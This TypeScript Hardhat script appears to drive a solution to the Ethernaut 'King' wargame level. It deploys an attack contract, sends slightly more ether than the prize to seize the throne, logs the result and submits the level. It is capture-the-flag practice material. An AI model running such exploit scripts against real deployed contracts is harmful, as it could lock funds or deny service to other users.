import { util } from 'chai'
import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { ForceAttack } from '../typechain-types'
import { King } from '../typechain-types/King'
import { KingAttack } from '../typechain-types/KingAttack'
import { loadOrCreateLevelInstance, submitLevelInstance } from './ethernaut'
import { loadOrDeployContract } from './helpers'

const levelAddress = '0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer

  const targetContract = (await loadOrCreateLevelInstance('King', levelAddress, signer, {
    value: ethers.utils.parseEther('0.001'),
  })) as King
  const attackContract = (await loadOrDeployContract('KingAttack', [], signer)) as KingAttack

  console.log('Target king: ', await targetContract._king())
  console.log('Target prize: ', await targetContract.prize())

  const attackTx = await attackContract.attack(targetContract.address, {
    value: ethers.utils.parseEther('0.0011'),
  })
  console.log('Attack tx id: ', attackTx.hash)
  await attackTx.wait()

  console.log('Target king: ', await targetContract._king())

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
